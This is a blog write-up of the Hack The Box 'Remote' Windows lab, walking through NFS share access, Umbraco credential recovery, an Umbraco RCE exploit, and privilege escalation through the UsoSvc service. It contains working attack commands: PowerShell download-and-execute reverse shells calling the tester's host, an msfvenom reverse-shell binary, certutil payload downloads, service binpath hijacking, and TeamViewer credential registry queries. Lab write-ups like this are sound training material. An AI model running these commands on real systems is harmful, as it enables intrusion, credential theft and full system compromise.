---
layout: post
title:  "Remote Writeup - Hack The Box"
date:   2025-09-29
desc: ""
keywords: "HTB,OSCP,eWPT,Windows,TCPing,Web Enumeration,NFS,Information Leakage,Umbraco CMS,TeamViewer,Easy"
categories: [HTB]
tags: [HTB,OSCP,eWPT,Windows,Web Enumeration,NFS,Information Leakage,Umbraco CMS,TeamViewer,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/remote_writeup/Remote.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I'm back to resume my practice with a machine that has **Windows** OS installed, which I admit is my favorite target on the **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** platform for a variety of reasons. The configurations that the creators make in these labs are excellent and I'm sure that they invest a lot of their **time**, **knowledge** and **creativity**. My lack of knowledge of Windows **features**, **applications**, **services** makes me put a lot of effort in research when looking for attack vectors and the satisfaction I experience when I succeed in engaging them is even greater. The **Remote** box is not very complex that's why it is rated as **Easy** by the community, although it took me quite a while to complete it. I'm going to login to my account to spawn the lab and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/remote_writeup/Remote_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check with `ping` that the connection to the lab is already established through the **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** VPN, for this I send a trace and confirm that the packets arrive correctly. Then with the tool developed by **[hack4u](https://hack4u.io/){:target="_blank"}**, `whichSystem.py`, I can know with an acceptable degree of certainty that the Operating System of the box is **Windows** thanks to the **TTL** value. Once the previous steps are completed I can start the **Reconnaissance** phase and list the open ports of the machine with `nmap` using the **TCP SYN scan** method. I take this opportunity to try a tool recommended by the community, **[TCPing](https://github.com/AyoobAli/TCPing){:target="_blank"}**, which can help me with future machines where ICMP protocol is not allowed and it is impossible to send a trace with `ping`. With the custom `nmap` scripts (written in **LUA**) I can leak information about services and their versions, which will allow me to look for possible attack vectors. I find very interesting information such as the possibility of **anonymous FTP access**, that the **Portmapper** service is available together with the **NFS system**, among other things.

> **[TCPing](https://github.com/AyoobAli/TCPing){:target="_blank"}** is a tool that allows you to use a **TCP** connection to **ping** a service. It can be used as a replacement of **ICMP Ping** in case the network doesn't allow **ICMP**, or as a service live check.

```bash
ping -c 2 10.10.10.180

git clone https://github.com/AyoobAli/TCPing
python3 tcping.py -i 10.10.10.180 -n 2

whichSystem.py 10.10.10.180
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.180 -oG allPorts
nmap -sCV -p21,80,111,135,139,445,2049,5985,47001,49664,49666,49667,49679 10.10.10.180 -oN targeted
cat targeted
# ftp: Anonymous FTP login allowed
# rpc: service NFS
# 2049/tcp  open  mountd        1-3 (RPC #100005)
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `crackmapexec` I can leak information from the **SMB** protocol as well as obtain additional data from the Operating System, the most relevant thing is that the protocol is **not signed** which can make it vulnerable to an **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. My next step is to take advantage of the **FTP** protocol to connect without a password, but I can't find resources to download nor can I upload malicious content to the server as I don't have the necessary privileges. When I try to list shared resources with `smbclient` or `smbmap` I'm denied access, most likely because I do not have valid credentials. I also have no luck connecting with `rpcclient`, through the **RPC** protocol, so I'm going to focus on **HTTP** which always presents the largest attack surface, and disclose the technology stack behind the web application with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**. I find that the **Umbraco CMS** is being used in the web application, but most of the functionalities are not implemented yet.

> **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**: This attack uses the **Responder** toolkit to capture **SMB** authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.

> **[SMB-Scanning](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker **impersonates** the user to gain unauthorized access.

> **[Umbraco](https://umbraco.com/knowledge-base/umbraco/){:target="_blank"}** is an open source **.NET CMS** (**Content Management System**) which is built on **Microsoft’s .NET** (**dot NET**) framework using **ASP.NET** and is written in **C#**. **Umbraco** offers developers high flexibility, security, and scalability. Also known as **“the friendly CMS”**, it gives users and content editors an easy-to-use interface and an intuitive editing experience.

```bash
crackmapexec smb 10.10.10.180

echo 'oldboy was here' > test.txt
ftp 10.10.10.180
  dir
  put test.txt
  quit

smbclient -L 10.10.10.180 -N
smbmap -H 10.10.10.180 -u 'null' --no-banner
rpcclient -U '' 10.10.10.180 -N

whatweb http://10.10.10.180

# http://10.10.10.180/
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I inspect the website and find the **PEOPLE** tab with the names of potential employees that I'm going to save immediately and then validate for possible system user accounts. When I try to access one of the resources I'm redirected to the authentication panel where I try some default emails, but the error messages I get make me suspect that I'm not going to be able to perform a **user enumeration** either. With `searchsploit` I find some vulnerabilities and their exploits in the local **Exploit-DB** database but I don't have the **Umbraco CMS** version yet.

```bash
# http://10.10.10.180/people/
curl -s -X GET http://10.10.10.180/people/ | html2text
curl -s -X GET http://10.10.10.180/people/ | html2text | grep '^*\**' | tr -d '*' | sed 's/\ //' | awk 'NR > 1'

# http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms
# admin@remote.htb, oldboy@remote.htb

searchsploit umbraco
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I remember that the **[Portmapper](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html?highlight=port%20111#basic-information){:target="_blank"}** service was available, but with the caveat that the **NFS** system was also available, so before I continue investigating the web application I'm going to look for shared resources on the **RPC server**. With the `rpcinfo` tool I get information from the **RPC services** of the victim host and confirm that the **NFS** protocol is enabled, which would allow me to access **Windows** resources from my **Linux** OS. With `showmount` I find the **site_backups** resource available to anyone, so I don't need valid credentials to configure an **nfs** mount with `mount`, but I will disable file locking with the **-o** parameter often needed on older **NFS** servers. I perform an enumeration of the newly mounted file system and there are some very interesting files like **Web.config**, but in the **Umbraco** directory, and more precisely in the **App_Data**, I leak information from the **Umbraco.sdf** file with `strings`, hashes of passwords of the system users, most probably. I can resort to tools like `john` or `hashcat` to try to crack the hash, but to speed up the task I use the online tool **[CrackStation](https://crackstation.net/){:target="_blank"}**, in which I can get in clear text a password.

> **[Portmapper](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html?highlight=port%20111#basic-information){:target="_blank"}** is a service that is utilized for mapping network service ports to **RPC** (**Remote Procedure Call**) program numbers. It acts as a critical component in **Unix-based** systems, facilitating the exchange of information between these systems. The port associated with **Portmapper** is frequently scanned by attackers as it can reveal valuable information. This information includes the type of Unix Operating System (**OS**) running and details about the services that are available on the system. Additionally, **Portmapper** is commonly used in conjunction with **NFS** (**Network File System**), **NIS** (**Network Information Service**), and other RPC-based services to manage network services effectively.

> **NFS** is a system designed for client/server that enables users to seamlessly access files over a network as though these files were located within a local directory.

> The **AppData** folder in **Windows 10** is a hidden folder located in **"C:\Users\AppData"**. It contains custom settings and other information that **PC system applications** need for their operation.

> A **[file with .sdf extension](https://docs.fileformat.com/database/sdf/){:target="_blank"}** contains the **Microsoft SQL Server Compact** (**SQL CE**) database which is also known as a compact relational database; produced by Microsoft for the applications made for mobile devices and desktops.

```bash
rpcinfo 10.10.10.180

showmount -e 10.10.10.180
pushd /mnt
mkdir NFSRemote
mount -t nfs 10.10.10.180:/site_backups /mnt/NFSRemote -o nolock

cat Web.config

cd App_Data
cat umbraco.config

cat Umbraco.sdf
strings Umbraco.sdf
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As the credentials correspond to **Umbraco CMS**, I try to log into the web application and I can access the **Dashboard**, where in the **Help** panel I find the version of the same. I search again with `searchsploit` for an exploit but now I am sure which is the version of the web technology. There are two **Python** scripts that catch my attention because they would allow me a **RCE**, with the first exploit that I download on my machine, after customizing the script because the **PoC** only opens the calculator with `calc.exe`, I can not execute my malicious command. With the other script I have more success executing commands and without the need to customize the script since I had everything automated, just in case I had searched in **Github** exploit developed by the community and there are many, such as **[noraj](https://github.com/noraj/Umbraco-RCE){:target="_blank"}**. Now I just need to get a **Reverse Shell** using **[nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1){:target="_blank"}** script, which I will customize so that once I transfer the script to the victim machine and it is imported, the module is executed immediately and the **Reverse Shell** is sent to my attacking machine. After exploiting **Umbraco CMS** again, I'm able to access the box.

> **Attacker Machine**:

```bash
# http://10.10.10.180/umbraco/#/login

umount /mnt/NFSRemote

searchsploit umbraco
searchsploit -x aspx/webapps/46153.py
# Execute a calc for the PoC
# login = "XXXX; password="XXXX"; host = "XXXX"; cmd.exe   [Customize]

python3 umbraco_exploit.py

searchsploit umbraco
searchsploit -m aspx/webapps/49488.py
mv 49488.py umbraco_exploit_0.py
python3 umbraco_exploit_0.py
python3 umbraco_exploit_0.py -u admin@htb.local -p b...e -i http://10.10.10.180 -c whoami
python3 umbraco_exploit_0.py -u admin@htb.local -p b...e -i http://10.10.10.180 -c hostname
python3 umbraco_exploit_0.py -u admin@htb.local -p b...e -i http://10.10.10.180 -c ipconfig

cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./PS.ps1
nvim PS.ps1
cat PS.ps1 | tail -n 1
python3 -m http.server 80

rlwrap -cAr nc -nlvp 443

python3 umbraco_exploit_0.py -u admin@htb.local -p b...e -i http://10.10.10.180 -c powershell.exe -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/PS.ps1')"
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can use **[Antonio Coco's project](https://github.com/antonioCoco/ConPtyShell){:target="_blank"}** to get a **fully interactive Reverse Shell**, but after making the necessary customizations to the script and getting the connection I can't get the commands to execute correctly, but it is a problem with my system because the script worked correctly in other virtual machines I have configured. I go back to the first connection and perform the first enumeration commands, where I find the **shared resources** in addition to accessing the contents of the first flag, there is also a shortcut to **TeamViewer** so it is very likely that it is installed on the victim system. The most promising thing I found as an attack vector is the special privilege **SeImpersonatePrivilege** that I have, which can make the system vulnerable to **RottenPotatoNG**, but before searching in **Github** for the **Juicy Potato** project I will leak OS information with `systeminfo` to know if it is vulnerable and also to know the **architecture** of it.

> **[ConPtyShell](https://github.com/antonioCoco/ConPtyShell){:target="_blank"}** is a project available on **GitHub** developed by **antonioCoco**. It is a **fully interactive reverse shell** designed for **Windows** systems, leveraging the **Pseudo Console** (**ConPty**) feature introduced in Windows.

> **RottenPotatoNG** and its variants leverages the privilege escalation chain based on **BITS service** having the **MiTM** listener on 127.0.0.1:6666 and when you have **SeImpersonate** or **SeAssignPrimaryToken** privileges. During a Windows build review we found a setup where **BITS** was intentionally disabled and port 6666 was taken.

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1
mv Invoke-ConPtyShell.ps1 ConPtyShell.ps1
nvim ConPtyShell.ps1
cat ConPtyShell.ps1 | tail -n 1
# Invoke-ConPtyShell -RemoteIp 10.10.14.10 -RemotePort 443 -Rows 29 -Cols 128

python3 -m http.server 80
nc -nlvp 443
python3 umbraco_exploit_0.py -u admin@htb.local -p b...e -i http://10.10.10.180 -c powershell.exe -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/ConPtyShell.ps1')"
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
# :(

cd C:\Users\Public\Desktop
dir

whoami /priv
whoami /all

systemInfo
# OS Name:                   Microsoft Windows Server 2019 Standard
# OS Version:                10.0.17763 N/A Build 17763
# System Type:               x64-based PC
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Although it seems to me that the **OS version** is not vulnerable, I do not remember well, I will try to exploit the **RottenPotatoNG**, for this I will download on my machine the `JuicyPotato.exe` from **[ohpe](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md){:target="_blank"}** and then transfer it to the **Remote** box. I try to perform the exploit and start the process of **Escalating privileges** but I have problems with the **CLSID**, but then I confirm on the page of **[interesting CLSID's](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md){:target="_blank"}** is not supported **Windows OS** version of the victim machine. To speed up a bit the search for attack vectors I'm going to resort to the excellent **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit){:target="_blank"}** tool from **PowerShellMafia**, which after transferring and running it informs me in a matter of seconds that the **[UsoSvc](https://www.kapilarya.com/what-is-update-orchestrator-service-usosvc-in-windows-11){:target="_blank"}** service can be abused. I start a new research on how to **escalate privileges** and my first resource is **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings){:target="_blank"}** but I can't find the right resource, so I make more effort in my search and I find the article **[“CVE-2019-1405 and CVE-2019-1322 - Elevation to SYSTEM via the UPnP Device Host Service and the Update Orchestrator Service”](https://www.fox-it.com/be-en/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/){:target="_blank"}** which not only explains the vulnerability but also gives me an example of how to perform the exploit.

> **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit){:target="_blank"}** is a collection of **Microsoft PowerShell** modules that can be used to aid penetration testers during all phases of an assessment.

> **[UsoSvc](https://www.kapilarya.com/what-is-update-orchestrator-service-usosvc-in-windows-11){:target="_blank"}** (**Update Orchestrator Service**) is an **essential Windows service** responsible for managing updates, including security patches, bug fixes, and new features. It takes care of fetching updates from Microsoft’s server and installing and verifying the updates on your Windows computer.

> **Attacker Machine**:

```bash
mv ~/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil -f -urlcache -split http://10.10.14.10/JP.exe .\JP.exe
.\JP.exe
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldb0y oldb0y123!$ /add"
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
nvim PowerUp.ps1
cat PowerUp.ps1 | tail -n 1
# Invoke-AllChecks
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/PowerUp.ps1')

# ServiceName   : UsoSvc
# Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
# StartName     : LocalSystem
# AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
# CanRestart    : True
# Name          : UsoSvc
# Check         : Modifiable Services
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The steps that I must carry out to achieve **privilege escalation** are not very complex, but before abusing the service I'm going to create an **.exe** binary with `msfvenom` to transfer it to the target machine and that it is in charge of sending me a **Reverse Shell**. The following is to stop the **usoscv** service with `sc.exe`, and then modify the **binpath** attribute that stores the path of the binary to be executed when the **usosvc** service is started, which will be the one that corresponds to my malicious binary. Finally I restart the service and succeed in catching the incoming **reverse shell** with `nc` on port **443** of my attacking machine, this way I succed to finish engaging the machine and access the last flag.

> **Attacker Machine**:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o reverse.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil -f -urlcache -split http://10.10.14.10/reverse.exe .\reverse.exe
sc.exe query usosvc
sc.exe stop usosvc
sc.exe query usosvc
sc.exe config usosvc binpath= "C:\Windows\Temp\privesc\reverse.exe"
# [SC] ChangeServiceConfig SUCCESS
sc.exe query usosvc
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
sc.exe start usosvc

whoami
hostname
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another possible vector for **privilege escalation** through the **[TeamViewer](https://www.teamviewer.com/en/global/support/knowledge-base/teamviewer-classic/what-is-teamviewer/){:target="_blank"}** application, which is running in the background and is accessible on port **5939**. This application **[saves the user's password](https://whynotsecurity.com/blog/teamviewer){:target="_blank"}** (encrypted with **AES-128-CBC**) and can be retrieved from the **Windows registry**. Unfortunately I'm not able to leak the password with the **registry queries** I perform, so it remains as a pending task to investigate more this vector that I could not use due to **my inexperience**.

> The term **[TeamViewer](https://www.teamviewer.com/en/global/support/knowledge-base/teamviewer-classic/what-is-teamviewer/){:target="_blank"}** stands both for the company **TeamViewer** and its **flagship** product. It is also informally used as a verb to represent the action of remote controlling a device via the **TeamViewer** software. **TeamViewer** is a leading global technology company that provides a connectivity platform to remotely access, control, manage, monitor, and repair devices – from laptops and mobile phones to industrial machines and robots.


```bash
tasklist
# TeamViewer_Service.exe        2156                            0     18,844 K

netstat -ano
# TCP    127.0.0.1:5939         0.0.0.0:0              LISTENING       2156

https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v SecurityPasswordExported
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v ServerPasswordAES
```

<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/remote_writeup/Remote_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine that leaves me with a great sense of satisfaction when I finished engaging it, which was rated as **Easy**, but this assessment should be taken **very carefully** because many of those who practice with these labs are very experienced and know well the field of **Information Security**, but for people like me the machine represents a real challenge and I need a long time to discover and exploit vulnerabilities. What is true is that I learn a lot with **Windows OS** labs as a target, mainly because of my lack of knowledge in these environments, but little by little I'm narrowing this gap to become the professional I dream of. I kill the **Remote** box to continue with the next one.

<br /><br />
<img src="{{ site.img_path }}/remote_writeup/Remote_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
